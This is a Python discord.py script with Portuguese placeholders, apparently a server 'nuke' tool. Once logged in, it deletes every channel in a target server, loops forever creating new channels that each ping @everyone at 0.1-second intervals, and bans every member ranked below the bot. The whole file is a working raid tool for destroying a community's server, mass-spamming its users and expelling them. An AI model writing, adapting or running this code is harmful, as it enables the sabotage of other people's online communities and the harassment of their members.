import discord
import asyncio

TOKEN = 'token da conta'
 
GUILD_ID = id do servidor

client = discord.Client()

@client.event
async def on_ready():
    print(f'Bot logged in as {client.user}')
    
    guild = discord.utils.get(client.guilds, id=ID_DO_SERVER)
    if guild is None:
        print("Servidor não encontrado!")
        return

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        except Exception as e:
            print(f'Failed to delete channel {channel.name}: {e}')

    async def create_channels():
        while True:
            try:
                new_channel = await guild.create_text_channel('NOME DO CANAL')
                print(f'Created a new channel: {new_channel.name}')
                
                await new_channel.send('@everyone')
                print('Sent message mentioning @everyone.')
                
                await asyncio.sleep(00.1)
            except Exception as e:
                print(f'Failed to create channel or send message: {e}')
                await asyncio.sleep(00.1)

    async def ban_members():
        bot_member = guild.get_member(client.user.id)
        if bot_member is None:
            print("Bot não encontrado no servidor!")
            return
        
        bot_role = bot_member.top_role
        forbidden_members = set()

        for member in guild.members:
            if member == bot_member:
                continue

            if member.top_role.position < bot_role.position:
                try:
                    await member.ban(reason="Banned by bot.")
                    print(f'Banned member: {member.name}')
                except discord.Forbidden:
                    if member.id not in forbidden_members:
                        print(f'No permission to ban member: {member.name}')
                        forbidden_members.add(member.id)
                except discord.HTTPException as e:
                    print(f'HTTP error while banning member {member.name}: {e}')
                except Exception as e:
                    print(f'Failed to ban member {member.name}: {e}')
                
                await asyncio.sleep(00.1)

    await asyncio.gather(create_channels(), ban_members())

client.run("token da conta")
